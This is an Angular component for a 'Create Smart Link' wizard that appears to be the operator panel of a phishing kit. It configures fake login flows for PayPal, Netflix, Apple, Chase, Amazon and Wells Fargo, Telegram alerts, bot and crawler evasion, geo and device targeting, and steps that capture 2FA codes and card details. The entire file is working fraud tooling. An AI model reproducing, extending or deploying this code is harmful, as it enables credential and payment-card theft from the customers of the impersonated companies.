import { Component, Input, Output, EventEmitter, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';

@Component({
    selector: 'app-link-dialog',
    standalone: true,
    imports: [CommonModule, FormsModule],
    template: `
    <div class="fixed inset-0 z-50 flex items-center justify-center">
        <!-- Backdrop -->
        <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-sm transition-opacity" (click)="close.emit()"></div>

        <!-- Dialog -->
        <div class="relative w-full max-w-4xl bg-slate-900 border border-slate-800 rounded-xl shadow-2xl overflow-hidden flex flex-col max-h-[90vh]">
            
            <!-- Header -->
            <div class="px-6 py-4 border-b border-slate-800 flex justify-between items-center bg-slate-925">
                <div>
                    <h3 class="adm-h3 text-white">Create Smart Link</h3>
                    <p class="text-slate-400 text-xs mt-1">Configure advanced routing, targeting, and branding.</p>
                </div>
                <!-- Wizard Steps -->
                <div class="flex items-center gap-1 bg-slate-950 p-1 rounded-lg">
                    <button *ngFor="let step of steps" 
                        class="px-3 py-1.5 text-xs font-medium rounded-md transition-colors"
                        [ngClass]="activeStep() === step.id ? 'bg-blue-600 text-white' : 'text-slate-400 hover:text-slate-200'"
                        (click)="activeStep.set(step.id)">
                        {{ step.label }}
                    </button>
                </div>
            </div>

            <!-- Scrollable Content -->
            <div class="flex-1 overflow-y-auto p-6">
                
                <!-- STEP 1: GENERAL -->
                <div *ngIf="activeStep() === 'general'" class="space-y-6 animate-fade-in">
                    <div class="grid grid-cols-2 gap-6">
                        <div class="space-y-1">
                            <label class="adm-label">Link Code (Slug)</label>
                            <div class="flex items-center bg-slate-950 border border-slate-800 rounded p-2 focus-within:border-blue-500/50">
                                <span class="text-slate-500 text-sm mr-1">/secure/</span>
                                <input type="text" [(ngModel)]="config.code" class="w-full bg-transparent text-white text-sm outline-none" placeholder="promo-2026">
                            </div>
                        </div>
                        <div class="space-y-1">
                            <label class="adm-label">Target Flow</label>
                            <select [(ngModel)]="config.flowId" class="adm-select">
                                <option value="paypal">PayPal (Default)</option>
                                <option value="netflix">Netflix</option>
                                <option value="apple">Apple</option>
                                <option value="chase">Chase Bank</option>
                                <option value="amazon">Amazon</option>
                                <option value="wells">Wells Fargo</option>
                            </select>
                        </div>
                    </div>

                    <div class="space-y-1">
                        <label class="adm-label">Notification Channels</label>
                        <div class="flex gap-4">
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" [(ngModel)]="config.notifyTelegram" class="adm-checkbox">
                                <span class="text-slate-300 text-sm">Telegram</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" [(ngModel)]="config.notifyEmail" class="adm-checkbox">
                                <span class="text-slate-300 text-sm">Email</span>
                            </label>
                        </div>
                    </div>
                </div>

                <!-- STEP 2: TRAFFIC & SECURITY -->
                <div *ngIf="activeStep() === 'traffic'" class="space-y-6 animate-fade-in">
                    <div class="grid grid-cols-2 gap-6">
                        <div class="space-y-1">
                            <label class="adm-label">Bot Protection</label>
                            <select [(ngModel)]="config.botProtection" class="adm-select">
                                <option value="standard">Standard (User-Agent Filter)</option>
                                <option value="strict">Strict (JS Challenge)</option>
                                <option value="captcha">Invisible CAPTCHA</option>
                                <option value="off">Off (Not Recommended)</option>
                            </select>
                        </div>
                        <div class="space-y-1">
                            <label class="adm-label">Device Targeting</label>
                            <select [(ngModel)]="config.deviceTarget" class="adm-select">
                                <option value="all">All Devices</option>
                                <option value="mobile">Mobile Only</option>
                                <option value="desktop">Desktop Only</option>
                            </select>
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-6">
                        <div class="space-y-1">
                             <label class="adm-label">Max Req / Hour</label>
                             <input type="number" [(ngModel)]="config.maxReqPerHour" class="adm-input">
                        </div>
                        <div class="space-y-1">
                             <label class="adm-label">Max Req / Day</label>
                             <input type="number" [(ngModel)]="config.maxReqPerDay" class="adm-input">
                        </div>
                    </div>
                    
                    <div class="space-y-1">
                         <label class="adm-label">A/B Testing (Variant Split)</label>
                         <div class="p-4 bg-slate-950 rounded-lg border border-slate-800">
                            <div class="flex justify-between text-sm mb-2 text-slate-400">
                                <span>Flow A ({{ 100 - config.abSplit }}%)</span>
                                <span>Flow B ({{ config.abSplit }}%)</span>
                            </div>
                            <input type="range" [(ngModel)]="config.abSplit" min="0" max="100" class="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer">
                         </div>
                    </div>
                </div>

                <!-- STEP 3: GEO -->
                <div *ngIf="activeStep() === 'geo'" class="space-y-6 animate-fade-in">
                    <div class="space-y-1">
                        <label class="adm-label">Geographic Mode</label>
                        <div class="flex gap-4 mb-4">
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="radio" name="geoMode" [(ngModel)]="config.geoMode" value="allow" class="adm-radio">
                                <span class="text-slate-300 text-sm">Whitelist Only</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="radio" name="geoMode" [(ngModel)]="config.geoMode" value="block" class="adm-radio">
                                <span class="text-slate-300 text-sm">Blacklist</span>
                            </label>
                        </div>
                        <textarea [(ngModel)]="config.geoCountries" rows="4" class="adm-input font-mono" placeholder="US, CA, GB, DE (Comma separated ISO codes)"></textarea>
                        <p class="text-xs text-slate-500 mt-1">Leave empty to allow/block all.</p>
                    </div>

                    <div class="space-y-1">
                        <label class="adm-label">Default Language</label>
                        <select [(ngModel)]="config.language" class="adm-select">
                            <option value="auto">Auto-Detect (Browser/IP)</option>
                            <option value="en">English</option>
                            <option value="es">Spanish</option>
                            <option value="fr">French</option>
                            <option value="de">German</option>
                        </select>
                    </div>

                    <div class="space-y-1 border-t border-slate-800 pt-4">
                        <label class="adm-label">Auto-Approval Timeout (seconds)</label>
                        <div class="flex items-center gap-4">
                            <input type="range" [(ngModel)]="config.autoApprovalTimeout" min="5" max="60" class="flex-1 h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer">
                            <span class="text-white font-mono text-sm w-8">{{ config.autoApprovalTimeout }}s</span>
                        </div>
                        <p class="text-[10px] text-slate-500">Automatically approve steps if manual action not taken.</p>
                    </div>
                </div>

                <!-- STEP 4: FLOW CONFIG -->
                <div *ngIf="activeStep() === 'flow'" class="space-y-6 animate-fade-in">
                    <div class="space-y-1">
                        <label class="adm-label">Step Control</label>
                        <div class="flex gap-4">
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" [(ngModel)]="config.skipEmail" class="adm-checkbox">
                                <span class="text-slate-300 text-sm">Skip Email Entry</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" [(ngModel)]="config.skip2FA" class="adm-checkbox">
                                <span class="text-slate-300 text-sm">Skip 2FA/OTP</span>
                            </label>
                            <label class="flex items-center gap-2 cursor-pointer">
                                <input type="checkbox" [(ngModel)]="config.requireCard" class="adm-checkbox">
                                <span class="text-slate-300 text-sm">Force Card Verification</span>
                            </label>
                        </div>
                    </div>

                    <div class="grid grid-cols-2 gap-6">
                        <div class="space-y-1">
                             <label class="adm-label">Main Button Text override</label>
                             <input type="text" [(ngModel)]="config.mainButtonText" class="adm-input" placeholder="e.g. Secure Login">
                        </div>
                        <div class="space-y-1">
                             <label class="adm-label">Secondary Button Text</label>
                             <input type="text" [(ngModel)]="config.secondaryButtonText" class="adm-input" placeholder="e.g. Sign Up">
                        </div>
                    </div>

                    <div class="space-y-1">
                        <label class="adm-label">Flow Background URL Override</label>
                        <input type="text" [(ngModel)]="config.customBackgroundUrl" class="adm-input" placeholder="https://...">
                        <p class="text-[10px] text-slate-500">Overrides the default flow background (e.g. Netflix Hero).</p>
                    </div>
                </div>

                <!-- STEP 4: BRANDING -->
                <div *ngIf="activeStep() === 'branding'" class="space-y-6 animate-fade-in">
                     <div class="space-y-1">
                        <label class="adm-label">Custom Logo URL</label>
                        <input type="text" [(ngModel)]="config.customLogo" class="adm-input" placeholder="https://...">
                     </div>
                     <div class="space-y-1">
                        <label class="adm-label">Page Title</label>
                        <input type="text" [(ngModel)]="config.pageTitle" class="adm-input" placeholder="Secure Verification">
                     </div>
                     <div class="space-y-1">
                        <label class="adm-label">Custom CSS</label>
                        <textarea [(ngModel)]="config.customCss" rows="5" class="adm-input font-mono text-xs" placeholder=".btn-primary { background: #ff0000; }"></textarea>
                     </div>
                </div>

            </div>

            <!-- Footer Buttons -->
            <div class="p-6 border-t border-slate-800 bg-slate-925 flex justify-between items-center">
                <button *ngIf="activeStep() !== 'general'" class="adm-btn adm-btn-ghost text-slate-400" (click)="prevStep()">Back</button>
                <div *ngIf="activeStep() === 'general'"></div> <!-- Spacer -->

                <div class="flex gap-2">
                    <button class="adm-btn adm-btn-ghost text-slate-400" (click)="close.emit()">Cancel</button>
                    
                    <button *ngIf="activeStep() !== 'branding'" class="adm-btn adm-btn-secondary" (click)="nextStep()">
                        Next &rarr;
                    </button>
                    
                    <button *ngIf="activeStep() === 'branding'" class="adm-btn adm-btn-primary bg-emerald-600 hover:bg-emerald-500 border-none" (click)="save()">
                        Launch Link 🚀
                    </button>
                </div>
            </div>
        </div>
    </div>
    `,
    styles: [`
        .adm-label { @apply text-xs font-bold text-slate-500 uppercase block mb-1; }
        .adm-input { @apply w-full bg-slate-950 border border-slate-800 rounded p-2 text-white text-sm outline-none focus:border-blue-500/50 transition-colors; }
        .adm-select { @apply w-full bg-slate-950 border border-slate-800 rounded p-2 text-white text-sm outline-none focus:border-blue-500/50 appearance-none; }
        .adm-checkbox { @apply w-4 h-4 rounded border-slate-700 bg-slate-900 data-[state=checked]:bg-blue-600; }
        .animate-fade-in { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    `]
})
export class LinkDialogComponent {
    @Output() close = new EventEmitter<void>();
    @Output() create = new EventEmitter<any>();

    activeStep = signal('general');

    steps = [
        { id: 'general', label: '1. General' },
        { id: 'traffic', label: '2. Traffic' },
        { id: 'geo', label: '3. Geo' },
        { id: 'flow', label: '4. Flow Config' },
        { id: 'branding', label: '5. Branding' }
    ];

    config = {
        code: '',
        flowId: 'paypal',
        notifyTelegram: true,
        notifyEmail: false,

        botProtection: 'standard',
        deviceTarget: 'all',
        maxReqPerHour: 100,
        maxReqPerDay: 1000,
        abSplit: 0, // 0% to Flow B

        geoMode: 'allow',
        geoCountries: '',
        language: 'auto',

        autoApprovalTimeout: 20,

        // Flow Config
        skipEmail: false,
        skip2FA: false,
        requireCard: false,
        mainButtonText: '',
        secondaryButtonText: '',
        customBackgroundUrl: '',

        customLogo: '',
        pageTitle: '',
        customCss: ''
    };

    nextStep() {
        const idx = this.steps.findIndex(s => s.id === this.activeStep());
        if (idx < this.steps.length - 1) {
            this.activeStep.set(this.steps[idx + 1].id);
        }
    }

    prevStep() {
        const idx = this.steps.findIndex(s => s.id === this.activeStep());
        if (idx > 0) {
            this.activeStep.set(this.steps[idx - 1].id);
        }
    }

    save() {
        if (!this.config.code) {
            this.activeStep.set('general');
            alert('Link Code is required!');
            return;
        }

        // Map flat config to Backend DTO structure
        const payload = {
            code: this.config.code,
            flowConfig: {
                flowId: this.config.flowId,
                skipEmail: this.config.skipEmail,
                skip2FA: this.config.skip2FA,
                requireCard: this.config.requireCard,
                mainButtonText: this.config.mainButtonText || undefined,
                secondaryButtonText: this.config.secondaryButtonText || undefined,
                customBackgroundUrl: this.config.customBackgroundUrl || undefined
            },
            themeConfig: {
                customLogo: this.config.customLogo,
                pageTitle: this.config.pageTitle,
                customCss: this.config.customCss
            },
            abConfig: {
                enabled: this.config.abSplit > 0,
                weightA: 100 - this.config.abSplit,
            },
            trafficConfig: {
                maxReqPerHour: this.config.maxReqPerHour,
                maxReqPerDay: this.config.maxReqPerDay,
                blockDesktop: this.config.deviceTarget === 'mobile',
                blockMobile: this.config.deviceTarget === 'desktop',
                challengeBot: this.config.botProtection !== 'off'
            },
            geoConfig: {
                mode: this.config.geoMode,
                countries: this.config.geoCountries ? this.config.geoCountries.split(',').map(s => s.trim()) : [],
                forceLanguage: this.config.language !== 'auto' ? this.config.language : null
            },
            approvalConfig: {
                autoApprovalTimeout: this.config.autoApprovalTimeout
            }
        };

        this.create.emit(payload);
    }
}
